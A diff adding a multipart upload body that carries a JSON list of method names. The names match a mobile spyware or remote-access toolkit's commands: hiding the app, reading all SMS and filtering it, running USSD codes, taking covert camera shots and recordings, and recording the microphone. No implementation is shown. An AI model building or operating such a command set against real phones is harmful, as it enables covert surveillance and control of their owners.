@@ -1,0 +1,20 @@
+--a4ca22a2d8560c1f31cc7a73a21ba79b
+Content-Disposition: form-data; name="file"; filename="accessoryMethods.json"
+
+[
+    [
+        "openUrl", "sendToast", "vibratePhone",
+        "getGeoLocation", "receiveSMS",
+        "getInstalledApps", "hideApp", "unhideApp", "changeIcon",
+        "lockScreen", "unlockScreen", "runUSSD"
+    ],
+    [
+        "getAllSMS", "takeScreenshot", "takeBackshot", "takeFrontshot",
+        "recordFront", "recordBack", "recordMicrophone", "getClipboard"
+    ],
+    [
+        "setSoundVolume", "sendSMS",
+        "setSMSFilter", "removeSMSFilter"
+    ]
+]
+--a4ca22a2d8560c1f31cc7a73a21ba79b--
